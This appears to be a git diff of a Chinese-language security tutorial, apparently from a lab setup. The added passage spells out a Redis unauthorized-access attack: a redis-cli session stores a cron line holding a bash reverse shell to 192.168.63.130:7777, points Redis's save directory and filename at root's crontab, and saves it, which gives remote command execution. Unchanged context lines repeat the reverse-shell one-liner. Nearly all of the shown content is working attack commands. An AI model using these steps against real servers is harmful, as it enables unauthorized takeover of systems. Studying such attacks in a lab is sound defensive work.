@@ -81,6 +81,19 @@ bash -c "bash -i >& /dev/tcp/192.168.63.130/7777 0>&1"
 ```shell
 * * * * * *  bash -c "bash -i  >&/dev/tcp/192.168.63.130/7777 0>&1"
 ```
+所以过程应该是
+```shell
+root@kali:~# redis-cli -h 192.168.63.130
+192.168.63.130:6379> set x "\n* * * * * *  bash -c 'bash -i  >&/dev/tcp/192.168.63.130/7777 0>&1'\n"
+OK
+# centos: /var/spool/cron/
+192.168.63.130:6379> config set dir /var/spool/cron/crontabs
+OK
+192.168.63.130:6379> config set dbfilename root
+OK
+192.168.63.130:6379> save
+OK
+```
 
 ### 使用脚本文件
 
@@ -105,6 +118,7 @@ $ chmod +x /tmp/test.sh
 ```shell
 ln -s -f bash /bin/sh
 ```
+
 
 
 ### 参考博客
